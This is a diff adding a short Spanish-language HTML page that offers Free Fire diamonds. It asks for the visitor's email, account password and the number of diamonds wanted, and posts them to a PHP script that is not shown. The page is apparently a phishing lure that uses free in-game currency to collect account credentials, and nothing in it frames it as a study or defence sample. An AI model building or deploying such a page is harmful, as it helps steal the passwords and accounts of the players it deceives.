@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solicitud de Diamantes para Free Fire</title>
+</head>
+<body>
+    <h2>Solicitud de Diamantes para Free Fire</h2>
+    <form action="enviar_solicitud.php" method="POST">
+        <label for="correo">Correo electrónico:</label>
+        <input type="email" id="correo" name="correo" required><br><br>
+        
+        <label for="contrasena">Contraseña:</label>
+        <input type="password" id="contrasena" name="contrasena" required><br><br>
+        
+        <label for="cantidad_diamantes">Cantidad de diamantes solicitada:</label>
+        <input type="number" id="cantidad_diamantes" name="cantidad_diamantes" min="1" required><br><br>
+        
+        <input type="submit" value="Enviar Solicitud">
+    </form>
+</body>
+</html>
